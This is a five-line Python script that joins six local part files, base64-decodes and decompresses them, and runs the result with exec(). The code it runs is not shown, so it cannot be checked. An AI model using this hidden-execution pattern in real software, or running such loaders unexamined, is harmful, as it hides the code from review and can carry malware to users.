from pathlib import Path
import base64,zlib
here=Path(__file__).resolve().parent
payload=''.join((here/f'r30p2.part{i}').read_text(encoding='utf-8').strip() for i in (1,2,3,4,5,6))
exec(zlib.decompress(base64.b64decode(payload)), {'__name__':'__main__'})
